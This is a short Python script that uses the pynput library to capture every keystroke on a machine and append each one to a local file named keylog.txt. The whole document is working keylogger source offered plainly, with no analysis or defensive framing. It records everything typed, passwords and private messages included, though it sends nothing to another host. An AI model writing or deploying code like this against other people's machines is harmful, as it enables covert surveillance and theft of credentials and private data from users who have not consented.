# Import necessary modules
from pynput import keyboard

# Define a function to write the pressed key to a log file
def on_press(key):
    try:
        # Open a log file in append mode
        with open("keylog.txt", "a") as f:
            # Write the pressed key to the file
            f.write(f"{key} pressed\n")
    except Exception as e:
        print(f"Error: {e}")

# Create a listener instance
with keyboard.Listener(on_press=on_press) as listener:
    # Start listening for keystrokes
    listener.join()
